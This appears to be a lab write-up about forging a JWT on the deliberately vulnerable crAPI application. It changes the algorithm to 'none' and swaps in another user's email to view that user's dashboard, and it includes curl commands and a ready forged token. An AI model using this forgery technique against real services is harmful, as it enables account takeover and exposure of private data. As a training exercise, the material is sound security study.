## Intro:
"user2" can forge the token of another user "pogba006@example.com" to access his dashboard...
## Before Forging the JWT
the dashboard endpoint requires token to view client info, 
```python unfold ln:false unwrap title:"code"
curl http://10.1.10.104/identity/api/v2/user/dashboard  -s | jq
```
![[Pasted image 20260901153630.png|736]]

so the user access his dashboard with his token. 
```python unfold ln:false unwrap title:"code"
curl http://10.1.10.104/identity/api/v2/user/dashboard -H "Authorization: Bearer $token" -s | jq
```
![[Pasted image 20260901153647.png]]

## Forging JWT
1- get the email address of another user 
when we access community posts of pogba we found his email address 
`pogba006@example.com`
![[Pasted image 20260901155433.png]]
![[Pasted image 20260901155546.png]]

2- Change the value of the “alg” property from header part **RS256** to “**none**”. And also change the email address  to `pogba006@example.com`
```python unfold ln:false unwrap title:"Updated"
{
  "alg": "none"
}
{
  "sub": "pogba006@example.com",
  "iat": 1787924377,
  "exp": 1788529177,
  "role": "user"
}
```

![[Pasted image 20260901161442.png]]

```zsh unfold ln:false unwrap title:"code"
eyJhbGciOiJub25lIn0.eyJzdWIiOiJwb2diYTAwNkBleGFtcGxlLmNvbSIsImlhdCI6MTc4NzkyNDM3NywiZXhwIjoxNzg4NTI5MTc3LCJyb2xlIjoidXNlciJ9.
```

3- we can access pogba's dashboard and know his information 
```zsh unfold ln:false unwrap title:"code"
curl http://10.1.10.104/identity/api/v2/user/dashboard -H "Authorization: Bearer $pogba_none_token" -s | jq
```
![[Pasted image 20260901161049.png]]

## WAF protection 
```zsh unfold ln:false unwrap title:"code"
curl http://crapi.local/identity/api/v2/user/dashboard -H "Authorization: Bearer $pogba_none_token" -s | jq
```
![[Pasted image 20260901161526.png]]
![[Pasted image 20260901161801.png]]

